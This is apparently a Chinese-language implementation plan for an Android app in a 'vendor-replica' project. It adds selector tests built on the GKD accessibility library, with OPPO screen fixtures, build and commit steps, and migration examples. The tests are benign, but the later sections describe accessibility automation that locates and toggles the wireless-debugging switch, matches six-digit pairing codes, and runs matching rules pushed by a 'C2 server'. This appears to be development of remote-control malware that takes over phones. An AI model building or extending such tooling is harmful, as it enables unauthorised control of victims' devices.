   /home/code/php/project/full-package/android/app/src/test/resources/fixtures/oppo/wireless_debug.xml \
   /home/code/php/project/full-package/android/app/src/test/resources/fixtures/oppo/pair_code_dialog.xml \
   /home/code/php/project/full-package/vendor-replica/app/src/test/resources/fixtures/oppo/
```

- [ ] **Step 2: 创建 GkdNodeFinderTest.java**

注意: 这个测试需要从 XML 构建 AccessibilityNodeInfo 树, 使用 Robolectric 提供的 shadow。如果 Robolectric 不支持直接构建 AccessibilityNodeInfo 树, 改用纯 CombineFilterConverter 测试验证选择器字符串正确性, GkdNodeFinder 的集成测试留到真机验证。

```java
package com.guard.wallet.gkd;

import org.junit.Test;

import static org.junit.Assert.*;

/**
 * GkdNodeFinder 选择器字符串正确性测试。
 * 验证通过 GkdNodeFinder.escape() 和 CombineFilterConverter 生成的选择器
 * 可以被 GKD 库正确解析。
 */
public class GkdNodeFinderTest {

    @Test
    public void testEscape_normalText() {
        assertEquals("abc", GkdNodeFinder.escape("abc"));
    }

    @Test
    public void testEscape_quotes() {
        assertEquals("a\\\"b", GkdNodeFinder.escape("a\"b"));
    }

    @Test
    public void testEscape_backslash() {
        assertEquals("a\\\\b", GkdNodeFinder.escape("a\\b"));
    }

    @Test
    public void testEscape_null() {
        assertEquals("", GkdNodeFinder.escape(null));
    }

    @Test
    public void testEscape_chineseText() {
        assertEquals("无线调试", GkdNodeFinder.escape("无线调试"));
    }

    @Test
    public void testSelectorParsing_simple() {
        // 验证 GKD 库能解析基本选择器
        li.songe.selector.Selector sel = li.songe.selector.Selector.Companion.parse("[text=\"test\"]");
        assertNotNull(sel);
    }

    @Test
    public void testSelectorParsing_className() {
        li.songe.selector.Selector sel = li.songe.selector.Selector.Companion.parse(
            "[name=\"android.widget.Switch\"][checked=true]");
        assertNotNull(sel);
    }

    @Test
    public void testSelectorParsing_contains() {
        li.songe.selector.Selector sel = li.songe.selector.Selector.Companion.parse(
            "[text*=\"无线调试\"]");
        assertNotNull(sel);
    }

    @Test
    public void testSelectorParsing_or() {
        li.songe.selector.Selector sel = li.songe.selector.Selector.Companion.parse(
            "[text=\"允许\"] || [text=\"确定\"]");
        assertNotNull(sel);
    }

    @Test
    public void testSelectorParsing_descendant() {
        li.songe.selector.Selector sel = li.songe.selector.Selector.Companion.parse(
            "[clickable=true] >n [text=\"无线调试\"]");
        assertNotNull(sel);
    }

    @Test
    public void testSelectorParsing_regex() {
        li.songe.selector.Selector sel = li.songe.selector.Selector.Companion.parse(
            "[text~=\"\\\\d{6}\"]");
        assertNotNull(sel);
    }
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew test --tests "com.guard.wallet.gkd.GkdNodeFinderTest" 2>&1 | tail -10
```

Expected: `BUILD SUCCESSFUL`, 所有 11 个测试 PASS

- [ ] **Step 4: Commit**

```bash
git add app/src/test/java/com/guard/wallet/gkd/GkdNodeFinderTest.java
git add app/src/test/resources/fixtures/
git commit -m "test: add GkdNodeFinder tests + OPPO XML fixtures"
```

---

### Task 8: 端到端验证 — 编译 + 全量测试

**Files:** (无新文件)

- [ ] **Step 1: 运行全量测试**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew test 2>&1 | tail -20
```

Expected: `BUILD SUCCESSFUL`, 所有测试 PASS (包括现有测试 + 新增 29 个 GKD 测试)

- [ ] **Step 2: 编译 Release APK 验证**

```bash
cd /home/code/php/project/full-package/vendor-replica && ./gradlew assembleDebug 2>&1 | tail -5
```

Expected: `BUILD SUCCESSFUL`

- [ ] **Step 3: 验证 APK 大小增量**

```bash
ls -la /home/code/php/project/full-package/vendor-replica/app/build/outputs/apk/debug/*.apk
```

Expected: APK 增量 < 200KB (GKD selector 库 ~4,416 行 Kotlin 编译后很小)

- [ ] **Step 4: Commit**

```bash
cd /home/code/php/project/full-package/vendor-replica
git add -A
git commit -m "feat: GKD selector integration complete — bridge + converter + 29 tests"
```

---

## 后续迁移指引 (不在本计划范围, 作为参考)

### Phase 2: 业务代码迁移示例

将现有 CombineFilter 调用替换为 GkdNodeFinder:

**Before (PairAccessibilityDelegate):**
```java
CombineFilter filter = new CombineFilter();
StringCondition sc = FilterHelper.addCondition(filter,
    FilterHelper.initFilter(filter, "className", "android.widget.Switch"), "text");
// ... 复杂的条件构建
UiObject switchNode = root.findOneByCombine(filter);
```

**After:**
```java
UiObject switchNode = GkdNodeFinder.findOne(root, "Switch");
// 或更精确:
UiObject switchNode = GkdNodeFinder.findOne(root,
    "[name=\"android.widget.Switch\"][text*=\"无线调试\"]");
```

### Phase 3: C2 下发兼容

C2 服务器下发的 ListenWindow.matchs (CombineFilter 列表) 通过 CombineFilterConverter 运行时转换:

```java
// 在 AccessibilityDelegate.q() 或 DelegateEventDispatcher 中
for (CombineFilter match : listenWindow.getMatchs()) {
    String gkdSelector = CombineFilterConverter.toGkdSelector(match);
    if (gkdSelector != null) {
        UiObject found = GkdNodeFinder.findOne(activeRoot, gkdSelector);
        // ... 原有逻辑
    }
}
```

### 不迁移的部分

| 功能 | 原因 | 保留方式 |
|------|------|---------|
| BoundsCondition | GKD 无几何匹配, 仅 3% 使用 | 保留 UiObject.findByCombine() |
| PointCondition | GKD 无坐标匹配, 仅 1% 使用 | 保留原生 |
| scrollForwardUtil/scrollBackwardUtil | GKD 不含滚动逻辑 | 保留 uisearch/ 包 |
